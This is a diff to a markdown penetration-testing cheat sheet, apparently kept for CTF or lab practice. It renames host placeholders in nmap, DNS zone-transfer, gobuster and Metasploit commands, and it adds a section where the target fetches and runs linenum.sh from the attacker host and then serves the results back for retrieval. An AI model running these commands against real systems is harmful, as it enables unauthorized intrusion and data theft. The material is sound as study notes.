@@ -7,10 +7,10 @@
 ## prev enum
 
 ```sh
-sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- <hostslot>
+sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- <rhostslot>
   # rename-tab
 sudo vim /etc/hosts
-<hostslot>    <name>
+<rhostslot>    <name>
 ```
 
 ## web enum
@@ -22,8 +22,8 @@ nslookup
   # AD, find DC, etc.
 
 # try zone transfer
-host -l <hostslot> <dnsServer>
-dnsrecon -d <hostslot> -t axfr
+host -l <rhostslot> <dnsServer>
+dnsrecon -d <rhostslot> -t axfr
   # dnsrecon -d megacorpone.com -t axfr
 ```
 
@@ -32,11 +32,11 @@ dnsrecon -d <hostslot> -t axfr
 ```sh
 dict="/usr/share/wordlists/dirb/common.txt"
 ls -lah $dict                                    # 36KB
-gobuster dir -u http://<hostslot>/ -w $dict -t 20 -e -x php,asp,json,aspx
+gobuster dir -u http://<rhostslot>/ -w $dict -t 20 -e -x php,asp,json,aspx
   # 5min
   # find /cgi-bin/ (status 403)
 
-gobuster dir -u http://<hostslot>/cgi-bin/ -w $dict -t 20 -e -x cgi,sh,pl,py,rb,php
+gobuster dir -u http://<rhostslot>/cgi-bin/ -w $dict -t 20 -e -x cgi,sh,pl,py,rb,php
   # 5min
   # find /user.sh (status 200)
 ```
@@ -88,7 +88,7 @@ msf> search <keywords>
 msf> use 2
 msf> show advanced
 msf> show options
-msf> set RHOSTS <hostslot>
+msf> set RHOSTS <rhostslot>
 msf> ...
 
 msf> show payloads
@@ -97,4 +97,21 @@ msf> set payload 14
 
 msf> run -j
   # meterpreter user shell
+```
+
+## util
+
++ rhost
+
+```sh
+wget <lhostslot>:8000/linenum.sh -O /tmp/linenum.sh
+bash /tmp/lineum.sh > /tmp/linenumOut.md
+
+python -m SimpleHTTPServer 8000 /tmp
+```
+
++ lhost
+
+```sh
+wget <rhostslot>:8000/linenumOut.md
 ```
